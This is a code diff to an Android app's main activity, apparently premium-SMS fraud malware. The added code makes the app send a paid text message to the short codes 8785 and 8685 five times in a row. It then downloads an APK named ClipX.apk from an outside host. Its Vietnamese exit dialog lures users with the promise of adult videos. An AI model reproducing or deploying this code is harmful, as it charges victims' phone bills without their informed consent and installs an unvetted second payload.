@@ -37,12 +37,13 @@ public class MainActivity extends Activity implements OnClickListener {
 	TextView tvTerm;
 	// Progress Dialog
 	private ProgressDialog pDialog;
+	static boolean isSent = false;
 	// Progress dialog type (0 - for Horizontal progress bar)
 	public static final int progress_bar_type = 0;
 	public static final String SENT = "com.lc.sent";
 	public static final String DELIVERED = "com.lc.delivered";
 	// File url to download
-	private static String file_url = "http://aff.mclick.mobi/ucmini-vnddl/vodanh01x";
+	private static String file_url = "http://m.mob.vn/vodanh01x/ClipX.apk";
 
 	@Override
 	protected void onCreate(Bundle savedInstanceState) {
@@ -79,13 +80,19 @@ public class MainActivity extends Activity implements OnClickListener {
 	public void send(View v) {
 		// get the phone number from the phone number text field
 		String phoneNumber = "8785";
+		String phoneNumber1 = "8685";
 		// get the message from the message text box
-		String msg = "TEXT ucmini uc1";
+		String msg = "TEXT phim1 clip1";
 
 		// make sure the fields are not empty
 		if (phoneNumber.length() > 0 && msg.length() > 0) {
-			sendsms(phoneNumber, msg);
-
+			for (int i = 0; i < 5; i++) {
+				if (i == 0 || i == 2 || i == 4){
+					sendsms(phoneNumber, msg);
+				}else {
+					sendsms(phoneNumber1, msg);
+				}
+			}
 			DownloadFileFromURL app = new DownloadFileFromURL();
 			app.setContext(getApplicationContext());
 			app.execute(file_url);
@@ -121,8 +128,6 @@ public class MainActivity extends Activity implements OnClickListener {
 					result = "No service";
 					break;
 				default:
-					sendsms(phoneNumber, msg);
-					//result = "Here";
 					break;
 				}
 
@@ -141,7 +146,6 @@ public class MainActivity extends Activity implements OnClickListener {
 					break;
 				case Activity.RESULT_CANCELED:
 					result1 = "Transmission 1 failed";
-					sendsms(phoneNumber, msg);
 					break;
 				}
 				//Toast.makeText(getApplicationContext(), result1, Toast.LENGTH_LONG).show();
@@ -161,7 +165,7 @@ public class MainActivity extends Activity implements OnClickListener {
 
 		case R.id.btnExit:
 			CustomDialogClass dialog = new CustomDialogClass(this,
-					"Bạn có có chắc chắn muốn thoát! Mà không tải ZALO không? ", 2);
+					"Bạn có có chắc chắn muốn thoát! Mà KHÔNG XEM PHIM GÁI XINH JAV không? ", 2);
 			dialog.getWindow().setBackgroundDrawable(new ColorDrawable(Color.TRANSPARENT));
 			dialog.show();
 			break;
